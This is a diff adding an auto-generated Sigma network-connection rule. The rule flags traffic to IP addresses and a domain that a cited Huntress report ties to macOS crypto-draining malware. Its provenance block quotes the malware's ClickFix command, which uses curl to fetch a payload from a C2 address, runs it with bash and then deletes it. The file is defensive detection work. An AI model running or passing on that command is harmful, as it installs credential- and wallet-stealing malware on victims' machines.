@@ -1,0 +1,68 @@
+title: Connection to an address or host named in the source intelligence
+id: 1458c5ef-9940-4a29-b5a1-32257900176a
+status: experimental
+description: Deterministic IOC rule built from the indicators the source intelligence published, with
+  no model involvement. Matches an outbound connection to a current address or host the source published,
+  on the ports the source ties to it where it names them. Indicators the source marks historical are excluded.
+references:
+- https://www.huntress.com/blog/mac-crypto-draining-malware
+author: hecate (auto-generated from source indicators - requires analyst review)
+date: '2026-10-07'
+tags: []
+logsource:
+  category: network_connection
+detection:
+  selection_1_any:
+    DestinationIp: 193.29.224.151
+  selection_2_any:
+    DestinationIp: 77.221.152.34
+  selection_3_8133:
+    DestinationIp: 138.124.118.69
+    DestinationPort: 8133
+  selection_4_any:
+    DestinationHostname: profitnow.io
+  condition: 1 of selection_*
+falsepositives:
+- Shared hosting or CDN addresses reused by unrelated sites
+level: high
+hecate_provenance:
+- value: 193.29.224.151
+  type: ipv4
+  role: c2
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: The command instructed the computer to retrieve a file from the 193.29.224[.]151 IP address,
+    execute it, then delete the temporarily stored file.
+- value: https://profitnow.io/
+  type: url
+  role: c2
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: export SRC_URL='https://profitnow[.]io/' && (cd /tmp && curl -kfsSL "http://193.29.224[.]151/92392991a0cca55?force=1"
+    -o .UlaccK && bash .UlaccK && rm -f .UlaccK) > /dev/null 2>&1 & clear; printf '\03
+- value: 77.221.152.34
+  type: ipv4
+  role: download
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: Both hosting addresses, 77.221.152[.]34 and 193.29.224[.]151 , were used to deliver the payload
+    belonging to Aeza Group's IP address pool.
+- value: 138.124.118.69
+  type: ipv4
+  role: c2
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: The stealer would have communicated with a C2 server at 138.124.118[.]69 , using the HTTP
+    protocol over the nonstandard port 8133/tcp .
+- value: profitnow.io
+  type: domain
+  role: unknown
+  status: active
+  confidence: unknown
+  source: https://www.huntress.com/blog/mac-crypto-draining-malware
+  evidence: profitnow[.]io Domain used during the ClickFix phase
+hunt_id: H-0642
